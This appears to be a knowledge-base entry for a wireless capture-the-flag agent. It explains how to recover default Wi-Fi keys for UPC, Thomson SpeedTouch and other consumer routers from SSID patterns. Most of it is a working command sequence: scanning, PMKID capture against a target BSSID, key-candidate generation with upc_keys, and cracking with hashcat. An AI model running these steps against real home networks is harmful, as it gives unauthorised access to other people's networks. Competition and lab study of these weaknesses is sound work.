# Default-PSK flags — no radio time required

**Verified against:** P1N3NUT5 knowledge corpus as of 2026-Q3

Some vendors derive the default PSK deterministically from the
BSSID, SSID suffix, or serial. If you can identify the vendor from
the beacon, the PSK is a lookup, not a crack.

## Known vendor signatures

| SSID / beacon pattern | vendor | derivation tool |
| --------------------- | ------ | ---------------- |
| `/^UPC\d{7}$/` | UPC / UBEE cable modems (EU) | `upc_keys` |
| `SpeedTouch……` (6-char suffix) | Thomson / Alcatel-Lucent | `stkeys` |
| `BTHub…-…` | BT SmartHub (UK) | vendor-known |
| `SKY…-…` | Sky Broadband (UK) | vendor-known |
| `TALKTALK-…` | TalkTalk (UK) | vendor-known |
| `Livebox-…` | Sagemcom (Orange FR) | vendor-known |
| `NETGEAR…` (older) | Netgear "Genie" default | pattern |

## The sequence

Real MCP tools: `recon_start`, `list_aps` (with `ssid_regex=`),
`do_capture_pmkid`, `convert_to_hashcat`. `upc_keys` /
`hcxpsktool` are off-MCP host tools — call them from the shell.

```python
# 1. Passive-scan; note SSID matches a signature above.
recon_start(band="both", dwell_ms=250)
# (wait a few seconds elsewhere)
list_aps(ssid_regex="^UPC\\d{7}$")

# 3. Validate offline against a captured PMKID or handshake.
do_capture_pmkid(bssid="<target-bssid>", timeout_s=30)
convert_to_hashcat(pcap_path="/tmp/pmkid.pcapng",
                   out_path="/tmp/hs.22000")
```

**Fallback shell chain — derivation + validation:**

```bash
# 2. run the vendor derivation
upc_keys UPC1234567 > /tmp/candidates.txt

# 4. crack against the captured hash
hashcat -m 22000 /tmp/hs.22000 /tmp/candidates.txt
# or PMKID-only offline check:
hcxpsktool --pmkid <pmkid> --essid UPC1234567 --pmk <candidate>
```

## The flag surface

PSK is the flag directly, or it decrypts a frame containing the
flag. In many WCTF puzzles the sleeper move is: several APs look
like WCTF targets, but the one with a `/^UPC\d{7}$/` SSID is
solvable in seconds while everyone else brute-forces rockyou.

## Cite

- attacks.json: `default-psk-upc-ubee`,
  `default-psk-thomson-speedtouch`.
- blasty upc_keys repo.
